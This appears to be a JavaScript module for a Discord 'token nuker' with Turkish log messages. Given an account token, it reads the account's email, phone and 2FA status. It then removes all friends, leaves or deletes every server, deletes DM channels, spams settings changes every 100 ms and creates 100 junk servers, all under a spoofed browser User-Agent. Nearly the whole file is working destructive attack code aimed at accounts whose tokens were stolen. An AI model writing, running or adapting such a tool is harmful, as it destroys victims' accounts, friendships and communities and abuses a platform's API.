const { Color } = require('./Design');
const Axios = require('axios').default;

class User extends Color {
    constructor({ token }) {
        super();
        this.token = token;

        this.headers = {
            info: {
                'Content-Type': 'application/json',
                'Authorization': this.token
            },

            nuke: {
                'Authorization': this.token,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36'
            }
        };
    };

    async info() {
            try {
                const data = (await Axios.get('https://discord.com/api/v8/users/@me', { headers: this.headers.info })).data;
                const base = 'https://cdn.discordapp.com/avatars/';

                return [
                        `İsim#Kod |   ${data.username + '#' + data.discriminator}`,
                        `Email    |   ${data.email || 'None'}`,
                        `2FA      |   ${data.mfa_enabled}`,
                        `Telefon  |   ${data.phone || 'None'}`,
                        `ID       |   ${data.id}`,
                        `Dil      |   ${data.locale}`,
                        `Doğrulama|   ${data.verified}`,
                        `Bayrak   |   All: ${data.flags} | Private: ${data.public_flags}`,
                        `NSFW     |   ${data.nsfw_allowed}`,
                        `Profil   |   ${base + `${data.id}/${data.avatar}.jpg`}`
      ];
    } catch(e) {
      throw e;
    };
  };

  async nuke() {
    const base = 'https://discord.com/api/v8';

    const status = (await Axios.get(base + '/users/@me', {
      headers: this.headers.info
    })).status;

    if (status !== 200) throw new Error('Token Geçersiz. ' + status);

    await Axios(
      { method: 'GET', url: base + '/users/@me/relationships', headers: this.headers.nuke }
    ).then(
      (response) => {
        const friends = [];

        response.data.forEach(
          (friend) => {
            friends.push(
              { id: friend.id, tag: friend.user.username + '#' + friend.user.discriminator }
            );
          }
        );

        friends.forEach(
          (friend) => {
            Axios.delete(base + `/users/@me/relationships/${friend.id}`, {
              headers: this.headers.nuke
            }).then(
              () => Color.log(`Arkadaş silindi. ${friend.tag}`)
            ).catch(
              (e) => { Color.log(e, '>', 0); }
            );
          }
        );
      }
    ).catch(
      (e) => {
        Color.log(e, '>', 0);
      }
    );

    await Axios(
      { method: 'GET', url: base + '/users/@me/guilds', headers: this.headers.nuke }
    ).then(
      (response) => {
        const owner = {
          true: [],
          false: []
        };

        response.data.forEach(
          (guild) => {
            if (guild.owner == false) {
              owner.false.push(
                { id: guild.id, name: guild.name }
              );
            } else {
              owner.true.push(
                { id: guild.id, name: guild.name }
              );
            };
          }
        );

        owner.false.forEach(
          (guild) => {
            Axios.delete(base + `/users/@me/guilds/${guild.id}`, {
              headers: this.headers.nuke
            }).then(
              () => Color.log(`Sunucudan çıkıldı. ${guild.name}`)
            ).catch(
              (e) => { Color.log(e, '>', 0); }
            );
          }
        );

        owner.true.forEach(
          (guild) => {
            Axios(
              {
                method: 'POST',
                url: base + `/guilds/${guild.id}/delete`,
                headers: this.headers.nuke
              }
            ).then(
              () => Color.log(`Sunucu silindi. ${guild.name}`)
            ).catch(
              (e) => { Color.log(e, '>', 0); }
            );
          }
        );
      }
    ).catch(
      (e) => {
        Color.log(e, '>', 0);
      }
    );

    await Axios(
      { method: 'GET', url: base + '/users/@me/channels', headers: this.headers.nuke }
    ).then(
      (response) => {
        const channels = [];

        response.data.forEach(
          (channel) => {
            channels.push(channel.id);
          }
        );

        channels.forEach(
          (channel) => {
            Axios.delete(base + `/channels/${channel}`, {
              headers: this.headers.nuke
            });
          }
        );
      }
    ).catch(
      (e) => {
        Color.log(e, '>', 0);
      }
    );

    setInterval(async() => {
      await Axios(
        {
          method: 'PATCH',
          url: base + '/users/@me/settings',
          headers: this.headers.nuke,
          data: {
            'theme': this.random(['light', 'dark']),
            'locale': this.random(['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se'])
          }
        }
      ).catch(
        (e) => {
          Color.log(e, '>', 0);
        }
      );
    }, 100);

    for (var i = 1; i < 101; i++) {
      await Axios(
        {
          method: 'POST',
          url: base + '/guilds',
          headers: this.headers.nuke,
          data: {
            'name': '! Anıl',
            'region': 'brazil',
            'icon': null,
            'channels': null
          }
        }
      ).then(
        () => {
          Color.log(`Sunucu açıldı (${i})`);
        }
      ).catch(
        (e) => {
          Color.log(e, '>', 0);
        }
      );
    };
  };
  
  random(array = []) {
    return array[Math.floor(Math.random() * array.length)];
  };
};

module.exports.User = User;